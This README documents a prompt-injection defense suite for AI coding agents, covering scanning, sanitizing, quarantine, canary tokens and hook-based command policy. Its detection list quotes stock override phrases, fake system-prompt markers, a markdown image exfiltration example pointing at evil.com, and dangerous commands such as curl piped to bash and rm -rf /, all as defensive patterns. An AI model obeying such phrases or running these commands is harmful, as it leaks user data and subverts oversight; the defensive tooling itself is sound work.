# OpenClaw Bastion Pro

Full prompt injection defense suite for [OpenClaw](https://github.com/openclaw/openclaw), [Claude Code](https://docs.anthropic.com/en/docs/claude-code), and any Agent Skills-compatible tool.

Everything in [openclaw-bastion](https://github.com/AtlasPA/openclaw-bastion) (free) plus automated countermeasures: block injections, sanitize hidden Unicode, quarantine compromised files, deploy canary tokens, and enforce content policies via hooks.

**Free version alerts. Pro version subverts, quarantines, and defends.**

## How Bastion Differs from Warden

| Tool                 | Domain                       | What It Watches                                                                                                    |
| -------------------- | ---------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| **openclaw-warden**  | Workspace identity integrity | SOUL.md, AGENTS.md, IDENTITY.md, memory files -- the files that define agent behavior                              |
| **openclaw-bastion** | Runtime content boundaries   | Files being read by the agent, web content, API responses, user-supplied documents -- everything the agent ingests |

Warden watches the **identity layer**. Bastion watches the **content layer**. Use both for defense in depth.

## Install

```bash
# Clone
git clone https://github.com/AtlasPA/openclaw-bastion-pro.git

# Copy to your workspace skills directory
cp -r openclaw-bastion-pro ~/.openclaw/workspace/skills/
```

## Usage

### Detection (also in free version)

```bash
# Scan entire workspace for injection patterns
python3 scripts/bastion.py scan

# Scan a specific file or directory
python3 scripts/bastion.py scan path/to/file.md
python3 scripts/bastion.py scan docs/

# Quick single-file check
python3 scripts/bastion.py check report.md

# Analyze content boundaries
python3 scripts/bastion.py boundaries

# View command allowlist/blocklist
python3 scripts/bastion.py allowlist

# Quick posture summary
python3 scripts/bastion.py status
```

### Pro Countermeasures

```bash
# Block injection patterns in a file (wraps in warning comments, creates .bak)
python3 scripts/bastion.py block suspicious-file.md

# Sanitize hidden Unicode (zero-width chars, RTL overrides)
python3 scripts/bastion.py sanitize path/to/file.md
python3 scripts/bastion.py sanitize path/to/directory/

# Quarantine a compromised file (moves to .quarantine/bastion/ with evidence)
python3 scripts/bastion.py quarantine compromised.md

# Restore a quarantined file
python3 scripts/bastion.py unquarantine compromised.md

# Deploy canary tokens into monitored files
python3 scripts/bastion.py canary
python3 scripts/bastion.py canary SOUL.md

# Generate Claude Code hook config for runtime enforcement
python3 scripts/bastion.py enforce

# Full automated defense sweep (scan + sanitize + quarantine + canary)
python3 scripts/bastion.py protect
```

All commands accept `--workspace /path/to/workspace`. If omitted, auto-detects from `$OPENCLAW_WORKSPACE`, current directory, or `~/.openclaw/workspace`.

## What It Detects

### Injection Patterns

- **Instruction override** -- "ignore previous instructions", "disregard above", "you are now", "new system prompt", "forget your instructions", "override safety", "entering developer mode"
- **System prompt markers** -- `<system>`, `[SYSTEM]`, `<<SYS>>`, `<|im_start|>system`, `[INST]`, `### System:`
- **Hidden instructions** -- Multi-turn manipulation ("in your next response, you must..."), stealth patterns ("do not tell the user", "hide this from the output")
- **Markdown exfiltration** -- Image tags with encoded data in URLs (`![](http://evil.com?data=BASE64)`)
- **HTML injection** -- `<script>`, `<iframe>`, `<img onerror=>`, `<svg onload=>`, hidden divs
- **Shell injection** -- `$(command)` subshell execution outside code blocks
- **Encoded payloads** -- Large base64 blobs outside code blocks
- **Unicode tricks** -- Zero-width characters, RTL overrides, invisible formatting
- **Homoglyph substitution** -- Cyrillic/Latin lookalikes mixed into ASCII text
- **Delimiter confusion** -- Fake markdown code block boundaries to escape context
- **Dangerous commands** -- `curl | bash`, `wget | sh`, `rm -rf /`, fork bombs

### Pro Countermeasures

- **Block** -- Neutralize injection patterns in-place by wrapping in `<!-- [BLOCKED by openclaw-bastion-pro] -->` comments. Creates `.bak` backup first.
- **Sanitize** -- Strip zero-width characters, RTL overrides, and hidden Unicode. Reports exactly what was removed.
- **Quarantine** -- Move compromised files to `.quarantine/bastion/` with evidence metadata (findings, risk level, timestamps).
- **Canary** -- Deploy unique canary tokens into monitored files. If tokens appear in exfiltrated data, it proves the attack accessed the file.
- **Enforce** -- Generate Claude Code hook configuration for PreToolUse (Read/Bash) and SessionStart hooks.
- **Protect** -- Full automated sweep: scan, sanitize, quarantine CRITICAL files, deploy canaries. Recommended for session startup.

### Smart Detection

- Respects markdown fenced code blocks (no false positives on documented examples)
- Per-file risk scoring (CLEAN / INFO / LOW / MEDIUM / HIGH / CRITICAL)
- Skips its own skill files (which describe injection patterns)
- Context-aware: only flags patterns in active content, not examples

## Free vs Pro

| Feature                      | Free | Pro |
| ---------------------------- | ---- | --- |
| Injection pattern scanning   | Yes  | Yes |
| Boundary analysis            | Yes  | Yes |
| Command allowlist display    | Yes  | Yes |
| Per-file risk scoring        | Yes  | Yes |
| Context-aware detection      | Yes  | Yes |
| Block injection patterns     | -    | Yes |
| Sanitize hidden Unicode      | -    | Yes |
| Quarantine compromised files | -    | Yes |
| Restore from quarantine      | -    | Yes |
| Canary token deployment      | -    | Yes |
| Hook enforcement config      | -    | Yes |
| Full automated protect sweep | -    | Yes |
| Alerting and audit trail     | -    | Yes |

## Command Policy

Bastion maintains a `.bastion-policy.json` in the workspace root with:

- **Allowlist**: Standard safe commands (git, python, node, npm, etc.)
- **Blocklist**: Dangerous patterns (curl pipe to shell, rm -rf /, fork bombs, etc.)

Run `allowlist` to create the default policy and view it. Edit the JSON file directly to customize. Bastion Pro enforces this policy at runtime via hooks.

## Exit Codes

| Code | Meaning           |
| ---- | ----------------- |
| 0    | Clean             |
| 1    | Warnings detected |
| 2    | Critical findings |

## Requirements

- Python 3.8+
- No external dependencies (stdlib only)
- Cross-platform: Windows, macOS, Linux

## License

MIT
